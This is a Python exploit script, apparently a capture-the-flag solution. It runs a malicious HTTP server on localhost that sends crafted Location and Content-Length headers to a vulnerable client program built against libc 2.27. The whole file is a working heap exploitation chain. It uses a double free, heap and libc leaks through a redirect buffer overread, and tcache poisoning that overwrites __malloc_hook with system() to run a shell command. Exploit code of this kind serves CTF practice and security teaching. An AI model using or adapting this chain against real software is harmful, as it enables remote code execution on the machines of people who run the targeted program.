from ptrlib import *
import contextlib
import socket

HOST, PORT = '127.0.0.1', 10080
BASE = 'http://{}:{}'.format(HOST, PORT)
PATH_0 = '/'
PATH_1 = '/' + '0' * 0x1f
PATH_B = '/' + 'B' * 7
PATH_C = '/' + 'C' * 0x1f
libc_base, heap_base = None, None
heap_delta = 0x52f
cmd_delta = 0x8e1

# cmd length must be larger than 0x18
cmd = b'ls -lha'
cmd += b' ' * 0x20

def exploit(sock, path):
    global libc_base
    global heap_base
    payload = b'HTTP/1.1 OK 200\r\n'
    print(path)

    if path == PATH_0:
        """ 1-1) double free
        prepare heap address
        """
        payload += str2bytes('Content-Length: {}\r\n'.format(0x40)) # make sure [0x55...2f] == NULL
        payload += str2bytes('Content-Length: {}\r\n'.format(0x10))
        payload += str2bytes('Location: {}\r\n'.format(PATH_1)) * 3
        payload += b'\r\n'

    elif path == PATH_1:
        """ 1-2) heap leak
        use buffer overread in redirect to leak heap address
        """
        payload += str2bytes('Location: /\r\n')
        payload += str2bytes('Content-Length: {}\r\n'.format(0x10))
        payload += b'\r\n'
            
    elif path.startswith(PATH_B):
        libc_base = u64(str2bytes(path)[8:]) - libc.main_arena() - 0x60
        logger.info("libc = " + hex(libc_base))
        """ 2-2) double free
        double free html
        """
        payload += str2bytes('Content-Length: {}\r\n'.format(0x10))
        payload += str2bytes('Location: {}\r\n'.format(PATH_C)) * 3
        payload += b'\r\n'

    elif path == PATH_C:
        """ 2-3) tcache poisoning
        overwrite fd to __malloc_hook and write one gadget
        since __malloc_hook is located at 0x7f...30,
        we can make fd point to 0x7f...2f ('/'==0x2f)
        also the first one byte can be '/' followed by one gadget address
        """
        malloc_hook = libc_base + libc.symbol('__malloc_hook')
        system = libc_base + libc.symbol('system')
        addr_cmd = heap_base + cmd_delta
        payload += b'Location: /' + cmd + b'\r\n'
        payload += b'Location: /' + p64(malloc_hook)[1:] + b'\r\n'
        payload += b'Location: /dummy\r\n'
        payload += b'Location: /' + p64(system) + b'\r\n'
        payload += str2bytes('Content-Length: {}\r\n'.format(addr_cmd - 1))
        payload += b'\r\n'
    
    elif path.startswith('/'):
        heap_base = u64(path) - heap_delta
        logger.info("heap = " + hex(heap_base))
        """ 2-1) libc leak
        allocate and free html
        use buffer overread in redirect to leak libc address
        """
        payload += str2bytes('Content-Length: {}\r\n'.format(0x420))
        payload += str2bytes('Location: /{}\r\n'.format('W'*0x30))
        payload += str2bytes('Content-Length: {}\r\n'.format(0x10)) * 3
        payload += str2bytes('Location: {}\r\n'.format(PATH_B))
        payload += b'\r\n'

    sock.send(payload)
    return

if __name__ == '__main__':
    libc = ELF("../distfiles/libc-2.27.so")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with contextlib.closing(sock):
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((HOST, PORT))
        sock.listen(1)
        while True:
            client, addr = sock.accept()
            with contextlib.closing(client):
                path = client.recv(4096).split()[1]
                exploit(client, bytes2str(path))
